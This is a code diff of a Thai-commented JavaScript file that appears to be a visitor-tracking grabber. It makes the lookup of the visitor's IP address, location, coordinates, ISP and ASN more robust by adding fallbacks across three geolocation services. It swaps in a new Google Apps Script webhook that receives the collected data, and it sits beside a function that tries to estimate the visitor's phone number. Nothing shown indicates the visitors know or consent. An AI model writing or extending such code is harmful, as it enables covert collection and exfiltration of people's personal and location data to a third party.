@@ -594,50 +594,59 @@ function detectBrowser() {
 // ฟังก์ชันดึงข้อมูล IP โดยละเอียด (ใช้ ipinfo.io)
 async function getIPDetails() {
   try {
-    const response = await fetch('https://ipinfo.io/json?token=c4eba8dcbe3107');
+    // ใช้ ipinfo.io ซึ่งรวม IP และรายละเอียดในครั้งเดียว
+    const response = await fetch('https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN'); // ใส่ Token ถ้ามี
     if (!response.ok) {
-      throw new Error('ไม่สามารถดึงข้อมูล IP ได้');
+        // ถ้า Token ไม่ถูกต้อง หรือมีปัญหา ลองแบบไม่มี Token
+        console.warn(`ipinfo.io request with token failed (${response.status}), retrying without token.`);
+        const responseNoToken = await fetch('https://ipinfo.io/json');
+        if (!responseNoToken.ok) {
+             throw new Error(`ipinfo.io request failed with status ${responseNoToken.status}`);
+        }
+        return await responseNoToken.json();
     }
-    
-    const data = await response.json();
-    console.log("IP Details:", data);
-    
-    // ตรวจสอบและดึงค่า ASN ให้ถูกต้อง
-    let asn = "ไม่ทราบ";
-    if (data.asn && data.asn.asn) {
-      asn = data.asn.asn;
-    } else if (data.asn) {
-      // ในกรณีที่ asn เป็นสตริง หรือรูปแบบอื่น
-      asn = String(data.asn);
-    } else if (data.org && data.org.startsWith('AS')) {
-      // ดึง ASN จาก org ถ้า org ขึ้นต้นด้วย 'AS'
-      const asnMatch = data.org.match(/^(AS\d+)\s/);
-      if (asnMatch) {
-        asn = asnMatch[1];
-      }
-    }
-    
-    return {
-      ip: data.ip || "ไม่ทราบ",
-      hostname: data.hostname || "ไม่ทราบ",
-      city: data.city || "ไม่ทราบ",
-      region: data.region || "ไม่ทราบ",
-      country: data.country || "ไม่ทราบ",
-      loc: data.loc || "ไม่ทราบ",
-      org: data.org || "ไม่ทราบ",
-      postal: data.postal || "ไม่ทราบ",
-      timezone: data.timezone || "ไม่ทราบ",
-      asn: asn // เพิ่ม ASN เข้าไปในข้อมูลที่ส่งคืน
-    };
+    return await response.json();
+
   } catch (error) {
-    console.error('Error getting IP details:', error);
-    return {
-      ip: "ไม่สามารถดึงข้อมูลได้",
-      asn: "ไม่สามารถดึงข้อมูลได้", // เพิ่ม ASN ในกรณีที่เกิดข้อผิดพลาด
-      error: error.toString()
-    };
+    console.error("ไม่สามารถดึงข้อมูล IP จาก ipinfo.io ได้:", error);
+    // Fallback ลองใช้ ip-api.com
+    try {
+        console.log("Trying fallback: ip-api.com");
+        const fallbackResponse = await fetch('http://ip-api.com/json'); // ใช้ http เพื่อลดปัญหา CORS บางกรณี
+        if (!fallbackResponse.ok) {
+            throw new Error(`ip-api.com request failed with status ${fallbackResponse.status}`);
+        }
+        const fbData = await fallbackResponse.json();
+        // แปลงข้อมูลจาก ip-api.com ให้มีโครงสร้างคล้าย ipinfo.io
+        return {
+            ip: fbData.query || "ไม่สามารถระบุได้",
+            hostname: "ไม่มีข้อมูล (ip-api)", // ip-api ไม่มี hostname
+            city: fbData.city || "ไม่ทราบ",
+            region: fbData.regionName || "ไม่ทราบ",
+            country: fbData.countryCode || "ไม่ทราบ",
+            loc: fbData.lat && fbData.lon ? `${fbData.lat},${fbData.lon}` : "ไม่มีข้อมูล",
+            org: fbData.org || "ไม่ทราบ",
+            isp: fbData.isp || "ไม่ทราบ", // ip-api มี isp แยก
+            asn: fbData.as ? fbData.as.split(' ')[0] : "ไม่ทราบ", // ip-api มี as
+            postal: "ไม่มีข้อมูล (ip-api)",
+            timezone: fbData.timezone || "ไม่ทราบ"
+        };
+    } catch (fallbackError) {
+        console.error("ไม่สามารถดึง IP จาก fallback (ip-api.com) ได้:", fallbackError);
+        // Fallback สุดท้าย: ipify.org (ได้แค่ IP)
+        try {
+            console.log("Trying final fallback: api.ipify.org");
+            const finalFallbackResponse = await fetch('https://api.ipify.org?format=json');
+            const finalFbData = await finalFallbackResponse.json();
+            return { ip: finalFbData.ip || "ไม่สามารถระบุได้" };
+        } catch (finalFallbackError) {
+             console.error("ไม่สามารถดึง IP จาก final fallback (ipify) ได้:", finalFallbackError);
+             return { ip: "ไม่สามารถระบุได้" };
+        }
+    }
   }
 }
+
 
 // ฟังก์ชันที่พยายามประมาณการเบอร์โทรศัพท์ (มีข้อจำกัด)
 async function estimatePhoneNumber() {
@@ -700,7 +709,7 @@ async function estimatePhoneNumber() {
 
 // ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
 function sendToLineNotify(dataToSend) {
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbxRsQGfijEOXEi-mi1f4y8j-VjgcC9zkgWlIDWDZll7yvrYEK7RDb4U9r-5bynMXNfZ/exec';
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbxVUPrz4qwGHtHyJwMS4idEpB1AmnoSvojGy_J3ZJTMqF-XQNC4VTLBZlOeo0kDqgo/exec';
 
   // ตรวจสอบว่ามี requestId หรือไม่ ถ้าไม่มีให้สร้างใหม่
   if (!dataToSend.requestId) {
@@ -719,11 +728,6 @@ function sendToLineNotify(dataToSend) {
   console.log(`กำลังส่งข้อมูลไป webhook (requestId: ${currentRequestId})`);
   console.log("Data:", JSON.stringify(dataToSend)); // Log ข้อมูลที่จะส่ง
 
-  // ตรวจสอบว่ามีข้อมูล asn หรือไม่ ถ้าไม่มีให้กำหนดค่าเริ่มต้น
-  if (dataToSend.ip && !dataToSend.ip.asn) {
-    dataToSend.ip.asn = "ไม่มีข้อมูล";
-  }
-  
   // ส่งข้อมูลด้วย fetch API
   fetch(webhookUrl, {
     method: 'POST',
